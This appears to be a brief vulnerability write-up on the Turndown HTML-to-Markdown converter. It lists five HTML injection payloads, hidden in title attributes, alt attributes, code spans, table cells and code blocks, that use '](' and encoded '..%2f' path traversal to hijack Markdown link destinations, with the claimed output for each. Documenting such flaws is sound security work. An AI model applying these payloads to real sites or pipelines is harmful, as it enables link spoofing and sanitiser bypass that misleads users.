# 🚨 CRITICAL: Turndown Conversion Bypasses - WORKING ATTACKS  

## Root Cause: HTML-to-Markdown Conversion Injection
Turndown converts HTML attributes to markdown syntax, allowing injection of malicious markdown structures.

## Working Bypasses:

### Title Attribute Injection
<a href="https://example.com/safe" title="](https://example.com/safe/..%2fattack)">Turndown title</a>
Result: `[Turndown title](https://example.com/safe "](https://example.com/safe/..%2fattack)")`

### Alt Attribute Injection
<img src="https://example.com/safe/img.png" alt="](https://example.com/safe/..%2fattack)" />
Result: `![](https://example.com/safe/..%2fattack)](https://example.com/safe/img.png)`

### Code Span Link Hijacking
<a href="https://example.com/safe"><code>](https://example.com/safe/..%2fattack)</code></a>
Result: `[`](https://example.com/safe/..%2fattack)`](https://example.com/safe)`

### Table Title Attributes
<table><tr><td title="](https://example.com/safe/..%2fattack)">cell</td></tr></table>
Result: Table preserves attack URL in title attribute

### Code Block Injection
<code>](https://example.com/safe/..%2fattack)</code>
Result: `` `](https://example.com/safe/..%2fattack)` ``

## Impact: Markdown Structure Corruption
These attacks corrupt the markdown structure itself, making the attack URLs the primary destinations rather than safe URLs.